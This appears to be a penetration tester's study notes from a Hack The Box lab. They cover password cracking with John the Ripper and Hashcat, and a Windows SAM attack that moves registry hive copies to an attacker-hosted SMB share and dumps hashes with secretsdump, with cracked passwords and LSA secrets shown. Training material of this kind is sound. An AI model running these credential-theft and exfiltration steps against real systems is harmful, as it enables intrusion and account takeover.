## John
#### Cracking with John

| **Hash Format**      | **Example Command**                                 | **Description**                                                      |
| -------------------- | --------------------------------------------------- | -------------------------------------------------------------------- |
| afs                  | `john --format=afs hashes_to_crack.txt`             | AFS (Andrew File System) password hashes                             |
| bfegg                | `john --format=bfegg hashes_to_crack.txt`           | bfegg hashes used in Eggdrop IRC bots                                |
| bf                   | `john --format=bf hashes_to_crack.txt`              | Blowfish-based crypt(3) hashes                                       |
| bsdi                 | `john --format=bsdi hashes_to_crack.txt`            | BSDi crypt(3) hashes                                                 |
| crypt(3)             | `john --format=crypt hashes_to_crack.txt`           | Traditional Unix crypt(3) hashes                                     |
| des                  | `john --format=des hashes_to_crack.txt`             | Traditional DES-based crypt(3) hashes                                |
| dmd5                 | `john --format=dmd5 hashes_to_crack.txt`            | DMD5 (Dragonfly BSD MD5) password hashes                             |
| dominosec            | `john --format=dominosec hashes_to_crack.txt`       | IBM Lotus Domino 6/7 password hashes                                 |
| EPiServer SID hashes | `john --format=episerver hashes_to_crack.txt`       | EPiServer SID (Security Identifier) password hashes                  |
| hdaa                 | `john --format=hdaa hashes_to_crack.txt`            | hdaa password hashes used in Openwall GNU/Linux                      |
| hmac-md5             | `john --format=hmac-md5 hashes_to_crack.txt`        | hmac-md5 password hashes                                             |
| hmailserver          | `john --format=hmailserver hashes_to_crack.txt`     | hmailserver password hashes                                          |
| ipb2                 | `john --format=ipb2 hashes_to_crack.txt`            | Invision Power Board 2 password hashes                               |
| krb4                 | `john --format=krb4 hashes_to_crack.txt`            | Kerberos 4 password hashes                                           |
| krb5                 | `john --format=krb5 hashes_to_crack.txt`            | Kerberos 5 password hashes                                           |
| LM                   | `john --format=LM hashes_to_crack.txt`              | LM (Lan Manager) password hashes                                     |
| lotus5               | `john --format=lotus5 hashes_to_crack.txt`          | Lotus Notes/Domino 5 password hashes                                 |
| mscash               | `john --format=mscash hashes_to_crack.txt`          | MS Cache password hashes                                             |
| mscash2              | `john --format=mscash2 hashes_to_crack.txt`         | MS Cache v2 password hashes                                          |
| mschapv2             | `john --format=mschapv2 hashes_to_crack.txt`        | MS CHAP v2 password hashes                                           |
| mskrb5               | `john --format=mskrb5 hashes_to_crack.txt`          | MS Kerberos 5 password hashes                                        |
| mssql05              | `john --format=mssql05 hashes_to_crack.txt`         | MS SQL 2005 password hashes                                          |
| mssql                | `john --format=mssql hashes_to_crack.txt`           | MS SQL password hashes                                               |
| mysql-fast           | `john --format=mysql-fast hashes_to_crack.txt`      | MySQL fast password hashes                                           |
| mysql                | `john --format=mysql hashes_to_crack.txt`           | MySQL password hashes                                                |
| mysql-sha1           | `john --format=mysql-sha1 hashes_to_crack.txt`      | MySQL SHA1 password hashes                                           |
| NETLM                | `john --format=netlm hashes_to_crack.txt`           | NETLM (NT LAN Manager) password hashes                               |
| NETLMv2              | `john --format=netlmv2 hashes_to_crack.txt`         | NETLMv2 (NT LAN Manager version 2) password hashes                   |
| NETNTLM              | `john --format=netntlm hashes_to_crack.txt`         | NETNTLM (NT LAN Manager) password hashes                             |
| NETNTLMv2            | `john --format=netntlmv2 hashes_to_crack.txt`       | NETNTLMv2 (NT LAN Manager version 2) password hashes                 |
| NEThalfLM            | `john --format=nethalflm hashes_to_crack.txt`       | NEThalfLM (NT LAN Manager) password hashes                           |
| md5ns                | `john --format=md5ns hashes_to_crack.txt`           | md5ns (MD5 namespace) password hashes                                |
| nsldap               | `john --format=nsldap hashes_to_crack.txt`          | nsldap (OpenLDAP SHA) password hashes                                |
| ssha                 | `john --format=ssha hashes_to_crack.txt`            | ssha (Salted SHA) password hashes                                    |
| NT                   | `john --format=nt hashes_to_crack.txt`              | NT (Windows NT) password hashes                                      |
| openssha             | `john --format=openssha hashes_to_crack.txt`        | OPENSSH private key password hashes                                  |
| oracle11             | `john --format=oracle11 hashes_to_crack.txt`        | Oracle 11 password hashes                                            |
| oracle               | `john --format=oracle hashes_to_crack.txt`          | Oracle password hashes                                               |
| pdf                  | `john --format=pdf hashes_to_crack.txt`             | PDF (Portable Document Format) password hashes                       |
| phpass-md5           | `john --format=phpass-md5 hashes_to_crack.txt`      | PHPass-MD5 (Portable PHP password hashing framework) password hashes |
| phps                 | `john --format=phps hashes_to_crack.txt`            | PHPS password hashes                                                 |
| pix-md5              | `john --format=pix-md5 hashes_to_crack.txt`         | Cisco PIX MD5 password hashes                                        |
| po                   | `john --format=po hashes_to_crack.txt`              | Po (Sybase SQL Anywhere) password hashes                             |
| rar                  | `john --format=rar hashes_to_crack.txt`             | RAR (WinRAR) password hashes                                         |
| raw-md4              | `john --format=raw-md4 hashes_to_crack.txt`         | Raw MD4 password hashes                                              |
| raw-md5              | `john --format=raw-md5 hashes_to_crack.txt`         | Raw MD5 password hashes                                              |
| raw-md5-unicode      | `john --format=raw-md5-unicode hashes_to_crack.txt` | Raw MD5 Unicode password hashes                                      |
| raw-sha1             | `john --format=raw-sha1 hashes_to_crack.txt`        | Raw SHA1 password hashes                                             |
| raw-sha224           | `john --format=raw-sha224 hashes_to_crack.txt`      | Raw SHA224 password hashes                                           |
| raw-sha256           | `john --format=raw-sha256 hashes_to_crack.txt`      | Raw SHA256 password hashes                                           |
| raw-sha384           | `john --format=raw-sha384 hashes_to_crack.txt`      | Raw SHA384 password hashes                                           |
| raw-sha512           | `john --format=raw-sha512 hashes_to_crack.txt`      | Raw SHA512 password hashes                                           |
| salted-sha           | `john --format=salted-sha hashes_to_crack.txt`      | Salted SHA password hashes                                           |
| sapb                 | `john --format=sapb hashes_to_crack.txt`            | SAP CODVN B (BCODE) password hashes                                  |
| sapg                 | `john --format=sapg hashes_to_crack.txt`            | SAP CODVN G (PASSCODE) password hashes                               |
| sha1-gen             | `john --format=sha1-gen hashes_to_crack.txt`        | Generic SHA1 password hashes                                         |
| skey                 | `john --format=skey hashes_to_crack.txt`            | S/Key (One-time password) hashes                                     |
| ssh                  | `john --format=ssh hashes_to_crack.txt`             | SSH (Secure Shell) password hashes                                   |
| sybasease            | `john --format=sybasease hashes_to_crack.txt`       | Sybase ASE password hashes                                           |
| xsha                 | `john --format=xsha hashes_to_crack.txt`            | xsha (Extended SHA) password hashes                                  |
| zip                  | `john --format=zip hashes_to_crack.txt`             | ZIP (WinZip) password hashes                                         |
|                      |                                                     |                                                                      |
#### Single Crack Mode


```shell
TheCyberScythe@htb[/htb]$ john --format=<hash_type> <hash or hash_file>
```

For example, if we have a file named `hashes_to_crack.txt` that contains `SHA-256` hashes, the command to crack them would be:


```shell
TheCyberScythe@htb[/htb]$ john --format=sha256 hashes_to_crack.txt
```
#### Wordlist Mode

`Wordlist Mode` is used to crack passwords using multiple lists of words. It is a dictionary attack which means it will try all the words in the lists one by one until it finds the right one. It is generally used for cracking multiple password hashes using a wordlist or a combination of wordlists. It is more effective than Single Crack Mode because it utilizes more words but is still relatively basic. The basic syntax for the command is:



```shell-session
TheCyberScythe@htb[/htb]$ john --wordlist=<wordlist_file> --rules <hash_file>
```

#### Incremental Mode

`Incremental Mode` is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set. This mode is the most effective yet most time-consuming of all the John modes. This mode works best when we know what the password might be, as it will try all the possible combinations in sequence, starting from the shortest one. This makes it much faster than the brute force attack, where all combinations are tried randomly. Moreover, the incremental mode can also be used to crack weak passwords, which may be challenging to crack using the standard John modes. The main difference between incremental mode and wordlist mode is the source of the password guesses. Incremental mode generates the guesses on the fly, while wordlist mode uses a predefined list of words. At the same time, the single crack mode is used to check a single password against a hash.

The syntax for running John the Ripper in incremental mode is as follows:

#### Incremental Mode in John
`Incremental Mode` is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set.

```shell
TheCyberScythe@htb[/htb]$ john --incremental <hash_file>
```


## Cracking Files

It is also possible to crack even password-protected or encrypted files with John. We use additional tools that process the given files and produce hashes that John can work with. It automatically detects the formats and tries to crack them. The syntax for this can look like this:

#### Cracking Files with John


```c#
cry0l1t3@htb:~$ <tool> <file_to_crack> > file.hash
cry0l1t3@htb:~$ pdf2john server_doc.pdf > server_doc.hash
cry0l1t3@htb:~$ john server_doc.hash
                # OR
cry0l1t3@htb:~$ john --wordlist=<wordlist.txt> server_doc.hash 
```

|**Tool**|**Description**|
|---|---|
|`pdf2john`|Converts PDF documents for John|
|`ssh2john`|Converts SSH private keys for John|
|`mscash2john`|Converts MS Cash hashes for John|
|`keychain2john`|Converts OS X keychain files for John|
|`rar2john`|Converts RAR archives for John|
|`pfx2john`|Converts PKCS#12 files for John|
|`truecrypt_volume2john`|Converts TrueCrypt volumes for John|
|`keepass2john`|Converts KeePass databases for John|
|`vncpcap2john`|Converts VNC PCAP files for John|
|`putty2john`|Converts PuTTY private keys for John|
|`zip2john`|Converts ZIP archives for John|
|`hccap2john`|Converts WPA/WPA2 handshake captures for John|
|`office2john`|Converts MS Office documents for John|
|`wpa2john`|Converts WPA/WPA2 handshakes for John|
**Find Where the Scripts Are**
```python
TheCyberScythe@htb[/htb]$ locate *2john*
```

#Essentials #Helpful #Bruteforce #Tool #JtR #John

--- 
## HashCat
- `hashcat -m 5600 crack.txt /usr/share/wordlists/fasttrack.txt1`
- `hashcat -m 5600 crack.txt /usr/share/wordlists/fasttrack.txt --show`
- `hashcat -m 5600 crack.txt /usr/share/wordlists/fasttrack.txt -r OneRuletoRulethemAll`


**Custom Rules**

| **Function** | **Description**                                   |
| ------------ | ------------------------------------------------- |
| `:`          | Do nothing.                                       |
| `l`          | Lowercase all letters.                            |
| `u`          | Uppercase all letters.                            |
| `c`          | Capitalize the first letter and lowercase others. |
| `sXY`        | Replace all instances of X with Y.                |
| `$!`         | Add the exclamation character at the end.         |

Each rule is written on a new line which determines how the word should be mutated. If we write the functions shown above into a file and consider the aspects mentioned, this file can then look like this:

#### Hashcat Rule File

Password Mutations

```python
TheCyberScythe@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

Hashcat will apply the rules of `custom.rule` for each word in `password.list` and store the mutated version in our `mut_password.list` accordingly. Thus, one word will result in fifteen mutated words in this case.

#### Generating Rule-based Wordlist

Password Mutations

```python
TheCyberScythe@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
TheCyberScythe@htb[/htb]$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

`Hashcat` and `John` come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is `best64.rule`, which can often lead to good results. It is important to note that password cracking and the creation of custom wordlists is a guessing game in most cases. We can narrow this down and perform more targeted guessing if we have information about the password policy and take into account the company name, geographical region, industry, and other topics/words that users may select from to create their passwords. Exceptions are, of course, cases where passwords are leaked and found.

#### Hashcat Existing Rules

Password Mutations

```python
TheCyberScythe@htb[/htb]$ ls /usr/share/hashcat/rules/

best64.rule                  specific.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
generated2.rule              T0XlC.rule
generated.rule               T0XlCv1.rule
hybrid                       toggles1.rule
Incisive-leetspeak.rule      toggles2.rule
InsidePro-HashManager.rule   toggles3.rule
InsidePro-PasswordsPro.rule  toggles4.rule
leetspeak.rule               toggles5.rule
oscommerce.rule              unix-ninja-leetspeak.rule
rockyou-30000.rule
```

## Cracking Hashes with Hashcat

Once we have the hashes, we can start attempting to crack them using [Hashcat](https://hashcat.net/hashcat/). We will use it to attempt to crack the hashes we have gathered. If we take a glance at the Hashcat website, we will notice support for a wide array of hashing algorithms. In this module, we use Hashcat for specific use cases. This should help us develop the mindset & understanding to use Hashcat as well as know when we need to reference Hashcat's documentation to understand what mode and options we need to use depending on the hashes we capture.

As mentioned previously, we can populate a text file with the NT hashes we were able to dump.

#### Adding nthashes to a .txt File

Attacking SAM

```python
TheCyberScythe@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Now that the NT hashes are in our text file (`hashestocrack.txt`), we can use Hashcat to crack them.

#### Running Hashcat against NT Hashes

Hashcat has many different modes we can use. Selecting a mode is largely dependent on the type of attack and hash type we want to crack. Covering each mode is beyond the scope of this module. We will focus on using `-m` to select the hash type `1000` to crack our NT hashes (also referred to as NTLM-based hashes). We can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes) or the man page to see the supported hash types and their associated number. We will use the infamous rockyou.txt wordlist mentioned in the `Credential Storage` section of this module.


```python
TheCyberScythe@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -> whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
```


#Essentials #Helpful #Bruteforce #Tool #HC #HashCat

---
### SAM Attacks
[[Impacket]] #Bruteforce 
Creating a Share with smbserver.py

All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the directory on our attack host where the share will be storing the hive copies (/home/ltnbob/Documents). Know that the smb2support option will ensure that newer versions of SMB are supported. If we do not use this flag, there will be errors when connecting from the Windows target to the share hosted on our attack host. Newer versions of Windows do not support SMBv1 by default because of the numerous severe vulnerabilites and publicly available exploits.

```python

TheCyberScythe@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share.
Moving Hive Copies to Share
```python


C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```
Then we can confirm that our hive copies successfully moved to the share by navigating to the shared directory on our attack host and using ls to list the files.
Confirming Hive Copies Transferred to Attack Host

```python

TheCyberScythe@htb[/htb]$ ls

sam.save  security.save  system.save

Dumping Hashes with Impacket's secretsdump.py

One incredibly useful tool we can use to dump the hashes offline is Impacket's secretsdump.py. Impacket can be found on most modern penetration testing distributions. We can check for it by using locate on a Linux-based system:
Locating secretsdump.py
Attacking SAM

TheCyberScythe@htb[/htb]$ locate secretsdump 
```
Using secretsdump.py is a simple process. All we must do is run secretsdump.py using Python, then specify each hive file we retrieved from the target host.
Running secretsdump.py
Attacking SAM
```python
TheCyberScythe@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up... 
```
Here we see that secretsdump successfully dumps the local SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the system bootkey before proceeding to dump the LOCAL SAM hashes. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section. Notice at the top of the secretsdump.py output:


This tells us how to read the output and what hashes we can crack. Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.

Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords. It may be beneficial to make a note of each user, so we know which password is associated with which user account.